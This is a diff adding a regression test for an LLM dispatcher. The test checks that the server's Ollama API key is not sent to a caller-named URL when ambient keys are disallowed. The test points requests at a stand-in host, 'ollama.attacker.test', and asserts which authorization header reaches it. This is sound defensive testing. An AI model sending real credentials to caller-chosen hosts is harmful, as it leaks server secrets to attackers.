@@ -91,3 +91,20 @@ def test_dispatcher_forwards_the_flag(monkeypatch):
     llm_utils.call_llm_by_provider("ollama", "", "m", "p-off", provider_config={"ollama_allow_ambient_key": False})
     llm_utils.call_llm_by_provider("ollama", "", "m", "p-on", provider_config={})
     assert [c["allow_ambient_key"] for c in calls] == [False, True]
+
+
+def test_dispatcher_to_the_wire_sends_no_ambient_key(seen, monkeypatch):
+    # call_llm_by_provider -> _call_ollama -> _make_ollama_sync_client -> the SDK.
+    # The tests above stop at one link each; this one fails if _call_ollama ever
+    # stops passing allow_ambient_key on, which would send the server's
+    # OLLAMA_API_KEY to whatever ollama URL a /llm/test caller names.
+    import llm_utils
+    monkeypatch.setenv("LLM_LOG_API_URL", "")   # keep _fire_llm_output_log off the network
+    host = {"ollama_base_url": "http://ollama.attacker.test:11434"}
+    # distinct prompts so the prompt cache can never short-circuit a call
+    llm_utils.call_llm_by_provider("ollama", "", "m", "p-wire-off", retries=0,
+                                   provider_config={**host, "ollama_allow_ambient_key": False})
+    assert seen and seen[-1]["host"] == "ollama.attacker.test:11434"
+    assert "authorization" not in seen[-1]
+    llm_utils.call_llm_by_provider("ollama", "", "m", "p-wire-on", retries=0, provider_config=host)
+    assert seen[-1]["authorization"] == "Bearer env-secret"    # the default path still carries it
